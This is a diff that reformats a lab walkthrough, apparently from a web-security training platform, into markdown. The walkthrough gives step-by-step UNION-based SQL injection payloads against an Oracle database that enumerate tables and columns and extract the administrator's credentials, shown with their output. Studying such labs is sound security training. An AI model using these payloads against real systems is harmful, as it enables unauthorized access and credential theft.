@@ -13,38 +13,62 @@ To solve the lab, log in as the administrator user.
 
 1/ Determine the number of columns
 
+```sql
 ' UNION SELECT NULL FROM dual--
 ' UNION SELECT NULL, NULL FROM dual--
+```
 
 
 2/ Determine the data type of columns
 
+```sql
 ' UNION SELECT 'AAA', 'AAA' FROM dual--
+```
 
 
 3/ Determine the type and version of the database
 
+```sql
 ' UNION SELECT NULL, banner FROM v$version--
-		Oracle Database 11g Express Edition Release 11.2.0.2.0
+```
+
+```text
+Oracle Database 11g Express Edition Release 11.2.0.2.0
+```
 
 
 4/ Determine the table names in the database
 
+```sql
 ' UNION SELECT NULL, table_name FROM all_tables--
-		USERS_ZNASIV
+```
+
+```text
+USERS_ZNASIV
+```
 
 
 5/ Determine the column names in the database
 
+```sql
 ' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='USERS_ZNASIV'--
-		USERNAME_ETLMJO
-		PASSWORD_PURGYP
-		EMAIL
+```
+
+```text
+USERNAME_ETLMJO
+PASSWORD_PURGYP
+EMAIL
+```
 
 
 6/ Determine the data
 
+```sql
 ' UNION SELECT USERNAME_ETLMJO, PASSWORD_PURGYP FROM USERS_ZNASIV--
-		administrator
-		ve2097vp0s7tsgaz1hgs
+```
+
+```text
+administrator
+ve2097vp0s7tsgaz1hgs
+```
 
